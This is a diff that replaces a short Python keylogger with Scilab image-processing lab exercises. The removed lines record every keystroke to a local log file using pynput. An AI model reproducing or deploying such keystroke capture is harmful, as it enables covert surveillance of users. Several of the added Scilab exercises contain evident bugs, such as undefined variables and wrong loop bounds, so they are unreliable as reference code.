@@ -1,10 +1,550 @@
-from pynput.keyboard import Key, Listener
-import logging
+1.a.      2D Linear Convolution
+clc;
+close;
+x = [1,2,3,4,5,6,7,8,9];
+h = [1;1;1];
+y = conv2(x,h); 
+disp('Linear convultion result y =',y);
 
-logging.basicConfig(filename=("key_log.txt"), level=logging.DEBUG,format='%(asctime)s:%(message)s:')
 
-def on_press(key):
-    logging.info(str(key))
+1.b. Circular Convolution between two 2D matrices
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+
+clc;
+x=[1,2;3,4];
+h=[5,6;7,8];
+X=fft2(x);
+H=fft2(h);
+Y=X.*H;
+y=ifft(Y);
+disp( 'Circular Convolution Result Y=',y)
+
+
+
+2.a    Circular Convolution expressed as linear convolution plus alias
+
+
+clc;
+x=[1,2;3,4];
+h=[5,6;7,8];
+y=conv2(x,h);
+y1=[y(:,1)+y(:,$),y(:,2)];
+y2=[y1(1,:)+y1($,:);y1(2,:)];
+disp('Linear Convolution result y=',y);
+disp(' Circular Linear Convolution expressed as Linear convolution plus alias=',y2);
+
+
+
+3. a.  Linear Cross correlation of a 2D matrix
+
+clc;
+x=[3,1;2,4];
+h1=[1,5;2,3];
+h2=h1(:,$:-1:1);
+h=h2($:-1:1,:);
+y=conv2(x,h)
+disp('Linear cross corelation of a 2D matrix y= ',y)
+
+
+
+3. b. Circular correlation between two signals
+
+clc;
+X=[1,5;2,4];
+h=[3,2;4,1];
+h2=h1(:,$:-1:1);
+h3=h2($:-1:1,:);
+X=fft2(x);
+H=fft2(h3);
+Y=X.*H;
+y=ifft(Y);
+disp('Circular Correlation Result y=',y)
+
+
+
+3. c. Linear auto correlation of a 2D matrix
+
+clc;
+x1=[1,1;1,1];
+x2=x1(:,$:-1:1);
+x2=x2($:-1:1,:)
+x=conv2(x1,x2)
+disp('Linear auto Correlation result x=',x)
+
+
+
+4   DFT of 4x4 gray scale image
+
+
+clc;
+f=[ 1 1 1 1;1 1 1 1;1 1 1 1;1 1 1 1];
+t=fft2(f);
+disp('display',t)
+
+
+
+5. a. Compute discrete cosine transform
+clc;
+N=[1,2,3,4]
+x=dct(N);
+disp('DCt matrix of order four',x)
+
+
+
+5. b. Program to perform KL transform for the given 2D matrix
+
+clc;
+f=[1,1,1,1;1,1,1,1;1,1,1,1;1,1,1,1];
+N=4
+for k=0:N-1
+ for l=0:N-1
+ w(k+1,l+1)=int(cos((2*%pi*k*1)/N)-%i*sin((2*%pi*k*1)/N))
+ end
+end
+disp('Kernel Matrix of 2d DFT=',w)
+F=w*f*w
+disp('2D DFT of given 2D image=',F)
+
+
+
+6. a. Brightness enhancement of an image
+
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"/images/baboon.png"));
+[m n] = size(a);
+for i = 1:m
+    for j = 1:n
+        b(i,j) = a(i,j) + 30;
+        end
+end
+
+figure(1)
+imshow(a)
+title("Original Image")
+
+figure(2)
+imshow(b)
+title("Brightness Enhanced Image");
+
+
+
+6. b. Brightness suppression of an image
+
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"images/baboon.png"));
+[m,n] = size(a);
+for i = 1:m
+    for j = 1:n
+        b(i,j) = a(i,j) - 30;
+    end
+end
+figure(1)
+imshow(a);
+title("Original Image");
+
+figure(2)
+imshow(b);
+title("Brightness Supressed Image");
+
+
+6. c. Contrast Manipulation
+
+// If first time install the package atomsInstall('IPCV')
+
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"/images/"+'baboon.png'));
+a = rgb2gray(a);
+[m n] = size (a);
+//t = imput('Enter The Threshold Parameter');
+for i = 1: m
+    for j = 1: n
+       b(i,j)=a(i,j)*2;       
+    end
+end
+figure(1)
+imshow(a);
+title('Original Image')
+
+figure(2)
+imshow(b);
+title('Contrast Manipulation');
+xlabel(sprintf(' Value is: '))
+
+
+
+6. d. Image negative
+
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"images/baboon.png"));
+[m n] = size(a);
+for i = 1:m
+    for j = 1:n
+        b(i,j) = a(i,j)-255;
+    end
+end
+
+figure(1)
+imshow(a);
+title("Original Image");
+
+figure(2)
+imshow(b);
+title("Image Negative");
+
+
+
+
+
+
+7. a. Perform threshold operation
+
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"images/baboon.png"));
+[m n] = size(a);
+for i = 1:m
+    for j=1:n
+        if(a(i,j)<100)
+            b(i,j) = 0;
+        else
+            b(i,j) = 255;
+        end
+    end
+end
+
+figure(1)
+imshow(a);
+title("Original Image")
+
+figure(2)
+imshow(b);
+title("Threshold Image");
+
+
+
+
+
+7. b. Perform gray level slicing without background
+
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"images/baboon.png"));
+a = rgb2gray(a)
+[m n] = size(a);
+for i = 1:m
+    for j = 1:j
+        if (a(i,j) < 100)
+            b(i,j) = 0;
+        elseif (a(i,j) > 200)
+            b(i,j) = 0;
+        else
+            b(i,j) = 255;
+       end
+    end
+end
+
+figure(1)
+imshow(a)
+title("Original Image");
+
+figure(2)
+imshow(b)
+title("Gray Level slicing without background");
+
+
+
+7.c Perform gray level slicing with background
+
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"images/baboon.png"));
+a = rgb2gray(a);
+[m n] = size(a);
+for i = 1:m
+    for j = 1:n
+        if(a(i,j)<100)
+            b(i,j) = 0;
+        elseif(a(i,j)>200)
+            b(i,j) = a(i,j);
+        else
+            b(i,j) = 255;
+        end
+    end
+end
+
+figure(1)
+imshow(a);
+title("Original Image");
+
+figure(2)
+imshow(b)
+title("Gray Level Slicing with background")
+
+
+7.d Perform Image Arithmetic operations
+
+
+clc;
+close;
+
+im1 = imread(fullpath(getIPCVpath() + "/images/baboon.png"));
+im2 = imread(fullpath(getIPCVpath() + "/images/peppers.png"));
+
+ima1 = imadd(im1, im2);
+ima2 = imadd(im1, 150);
+subplot(221);imshow(im1);title('First Image');
+subplot(222);imshow(im2);title('Second Image');
+subplot(223);imshow(ima1);title('First Image + Second Image');
+subplot(224);imshow(ima2);title('First Image + constant*100');
+
+ims1 = imsubtract(im1, im2);
+ims2 = imsubtract(im1, 200);
+scf();
+subplot(221);imshow(im1);title('First Image');
+subplot(222);imshow(im2);title('Second Image');
+subplot(223);imshow(ims1);title('First Image - Second Image');
+subplot(224);imshow(ims2);title('First Image - constant*100');
+
+imm1 = immultiply(im1 , im2);
+imm2 = immultiply(im1, 25);
+scf();
+subplot(221);imshow(im1);title('First Image');
+subplot(222);imshow(im2);title('Second Image');
+subplot(223);imshow(imm1);title('First Image * Second Image');
+subplot(224);imshow(imm2);title('First Image * constant * 2');
+
+imd1 = imdivide(im1 , im2);
+imd2 = imdivide(im1, 0.05);
+scf();
+subplot(221);imshow(im1);title('First Image');
+subplot(222);imshow(im2);title('Second Image');
+subplot(223);imshow(imd1);title('First Image / Second Image');
+subplot(224);imshow(imd2);title('First Image / constant / 0.2');
+
+
+
+8 Image Segmentation
+
+
+8. a. Differentiation of Gaussian function
+clc;
+close;
+sigma = input('Enter the value of sigma:')
+i = -10:.1:10;
+j = -10:.1:10;
+r = sqrt(i.*i+j.*j)
+y = (1/(sigma^2))*(((r.*r)/sigma^2)-1).*exp(-r.*r/2*sigma^2);
+plot(i,y)
+legend(sprintf('The sigma value is %g',sigma)) 
+title('Differentiation of gaussian function')
+
+
+8. b. Shape Of DOG Filter
+
+//Shape Of DOG Filter
+
+clc;
+close;
+sigma1 = input('Enter the value of sigma 1:')
+sigma2 = input('Enter the value of sigma 2:')
+i = -10:.1:10;
+j = -10:.1:10;
+r = sqrt(i.*i+j.*j);
+y1 = (1/(sigma1^2))*(((r.*r)/sigma1^2)-1).*exp(-r.*r/2*sigma1^2);
+y2 = (1/(sigma2^2))*(((r.*r)/sigma2^2)-1).*exp(-r.*r/2*sigma2^2);
+y=y1-y2;
+plot(i,y)
+title('Shape of DoG Filter')
+
+
+9 Binary Image Processing 
+
+9. a. Image Dilation 
+9. b. Image Erosion 
+9. c. Image Opening 
+9. d. Image Closing
+
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"images/morpex.png"));
+
+figure(0)
+imshow(a);
+title("Original Image")
+
+se = imcreatese("ellipse",9,9);
+a1 = imopen(a, se);
+figure(1);
+imshow(a1);
+title("Image Open")
+
+se = imcreatese("ellipse",11,11);
+a2 = imclose(a, se);
+figure(2);
+imshow(a2);
+title("Image Close")
+
+se = imcreatese("rect",3,3);
+a3 = imdilate(a, se);
+figure(3);
+imshow(a3);
+title("Image Dilate")
+
+se = imcreatese("rect",3,3);
+a4 = imerode(a, se);
+figure(4);
+imshow(a4);
+title("Image Erode")
+
+
+
+10 Color Image processing
+
+
+10. a. Histogram of Gray Scale Image and equalized Image
+function histoplot(number, image, header)
+    image = double(image);
+    
+    [m n] = size(image);
+    c = m * n;
+    h = zeros(1,300);
+    
+    for i = 1:1:m
+        for j = 1:1:n
+            if (image(i,j)== 0)
+                image(i,j) = 1;
+            end
+            t = image(i,j);
+            h(t) = h(t) + 1;
+        end
+    end
+    
+    figure(number)
+    bar(h)
+    title(header)
+endfunction
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"images/Lena_dark.png"));
+
+figure(2)
+imshow(a)
+title("Original Image")
+
+histoplot(1, a, "Histogram of Gray Scale Image")
+
+H = imhistequal(a);
+figure(3)
+imshow(H)
+title("Histogram Equalized Image");
+
+histoplot(4, H,"Histogram of Equalized Image");
+
+
+
+10. b. Histogram of Color Image
+
+function histoplot(number, image, header)
+    image = double(image);
+    
+    [m n] = size(image);
+    c = m * n;
+    h = zeros(1,300);
+    
+    for i = 1:1:m
+        for j = 1:1:n
+            if (image(i,j)== 0)
+                image(i,j) = 1;
+            end
+            t = image(i,j);
+            h(t) = h(t) + 1;
+        end
+    end
+    
+    figure(number)
+    bar(h)
+    title(header)
+endfunction
+
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"images/baboon.png"));
+figure(1)
+imshow(a);
+title("Color Image")
+histoplot(2,a,"histogram of Color Image")
+
+
+
+10. c Read an RGB image and extract the threecolor components red green blue
+
+
+function showImage(number, image, header)
+    figure(number)
+    title(header)
+    imshow(image)
+endfunction
+clc;
+close;
+
+a = imread(fullpath(getIPCVpath()+"images/baboon.png"));
+
+a1 = a
+a2 = a
+a3 = a
+
+a1(:,:,1) = 0
+a2(:,:,2) = 0
+a3(:,:,3) = 0
+
+showImage(0,a,"Original Image")
+showImage(1, a1,"a1");
+showImage(2, a2,"a2");
+showImage(3, a3,"a3");
+
+
+
+10. d Read a Color image and separate the color image into red green and blue planes
+
+clc;
+close;
+a = imread(fullpath(getIPCVpath()+"images/baboon.png"));
+
+R = a(:,:,1);
+G = a(:,:,2);
+B = a(:,:,3);
+
+[yR,x] = imhist(R)
+[yG,x] = imhist(G)
+[yB,x] = imhist(B)
+
+plot(x,yR,"Red",x,yG,"Green",x,yB,"Blue");
+
+figure(1)
+imshow(a)
+title("Original Image")
+
+figure(2)
+bar(x,yR,"Red");
+title("Red");
+
+figure(3)
+bar(x, yG,"Green");
+title("Green")
+
+figure(4)
+bar(x,yB,"Blue");
+title("Green");
+
+
+
+
+
+
+
+
+
